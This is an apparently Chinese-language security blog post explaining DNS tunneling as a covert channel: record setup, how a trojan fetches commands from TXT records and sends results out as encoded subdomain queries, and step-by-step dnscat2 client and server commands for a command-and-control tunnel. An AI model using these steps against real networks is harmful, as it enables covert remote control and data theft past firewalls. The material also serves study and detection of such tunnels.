---
categories: null
date: "2018-12-18T00:00:00Z"
description: DNS Tunneling，是隐蔽信道的一种，通过将其他协议封装在DNS协议中传输建立通信。因为在我们的网络世界中DNS是一个必不可少的服务，所以大部分防火墙和入侵检测设备很少会过滤DNS流量，这就给DNS作为一种隐蔽信道提供了条件，从而可以利用它实现诸如远程控制，文件传输等操作，现在越来越多的研究证明DNS
  Tunneling也经常在僵尸网络和APT攻击中扮演着重要的角色。
title: Intranet Space - Dns Tunneling
url: /archivers/2018-12-18/6
---

## 0x00 DNS隧道简介


DNS Tunneling，是隐蔽信道的一种，通过将其他协议的数据封装在DNS协议中传输建立通信。

普通的 DNS 查询过程如下:

客户端发送 DNS 请求->DNS 服务器->如果 DNS 服务器寻找不到该记录->继续递归查询->寻找该域名 的 NS 记录->询问 NS 记录指向的 DNS 服务器->DNS 服务器响应->传输给客户端。


本次通过设置一个 NS 服务器，实现了 DNS 隧道的建立，使得服务器可向客户端发送任意命令，并且回 传命令执行的结果。
DNS 隧道是隐蔽的、可加密的数据传输隧道，基于 UDP 协议，目的端口号为 53。

它的缺点就是不稳定、 传输过大文件时容易失去连接，需要重新建立。


## 0x01 DNS隧道原理

DNS 隧道简单例子:

| 类型 | 主机记录 | 记录值 | 
| - | :-: | -: | 
| NS | HACK | NS.XXX.COM | 
| A | NS | XXX.XXX.XXX.XXX | 


首先在 DNS 解析管理平台上设置一个 NS 和一个 A 记录:


当我们询问 hello.HACK.XXX.COM 时，DNS 客户端发送的查询请求会递归到主机记录 NS 指向的 XXX.XXX.XXX.XXX 服务器上。
黑客通过在 XXX.XXX.XXX.XXX 服务器上监听 53 端口，即可获得 DNS 客户端发送来的请求。

## 0x02 如何获得命令执行结果?

这里需要木马的配合，黑客会在服务器端的程序上专门设置一个 TXT 的主机记录，用于存放命令。 

木马会不断请求 COMMAND.HACK.XXX.COM，获得 TXT 的解析结果，并执行，然后将结果进行分段加密传送至 DNS 服务器，构造一个 A 记录的查询请求。

例如服务端:`set command=ipcofig`

客户端:请求 `COMMAND.HACK.XXX.COM`，得到解析结果ipconfig

操作系统执行后，返回结果一般如下:

```
WINDOWS IP Configuration:
......
```

此时木马将 WINDOWS IP Configuration 进行编码加密，可能是如下形式:

```
U2FsdGVkX19cMV2s858WNyKHm5mRXx4VXng1nK8bFG5XKQSaO52vXKIsX0IZ1pxyCdI
```

然后拼接成域名为:

```
U2FsdGVkX19cMV2s858WNyKHm5mRXx4VXng1nK8bFG5XKQSaO52vXKIsX0IZ1pxyCdI.H ACK.XXX.COM
```

服务端接收后，会使用密钥解密这串字符，得到命令执行结果。

这样反复的过程就能达到永久控制客户端的目的。


## 0x03 如何判断是否能够建立隧道?

使用 nslookup 工具查询 DNS 解析记录。

命令:

* `nslookup @114.114.114.114 baidu.com`
* `nslookup @8.8.8.8 baidu.com`
* `nslookup @内网DNS Server baidu.com`

如果均能查询到 A 记录后，再换一些不常见域名，例如:translate.google.cn 

若还是能够解析，则可以构建 DNS 隧道。

## 0x04 dnscat2

This tool is designed to create an encrypted command-and-control (C&C) channel over the DNS protocol, which is an effective tunnel out of almost every network.

> **dnscat2分为客户端和服务端**

客户端配置：

```
$ git clone https://github.com/iagox86/dnscat2.git
$ cd dnscat2/client/
$ make
$ dnscat <Domain>
```

服务端配置（需要Ruby环境）：

```
$ git clone https://github.com/iagox86/dnscat2.git
$ cd dnscat2/server/
$ gem install bundler
$ bundle install
$ ./dnscat2 --dns server=x.x.x.x,port=53
```
这一切的前提是按照0x01中的环境配置好后再操作。

DNS配置：

| 类型 | 主机记录 | 记录值 | 
| - | :-: | -: | 
| NS | dns | ns.payloads.online | 
| A | ns | 1.1.1.1 | 

```
# 服务器(1.1.1.1)
root@payloads:~# tcpdump udp port 53
```

```
# 客户端
nslookup hello.dns.payloads.online
```

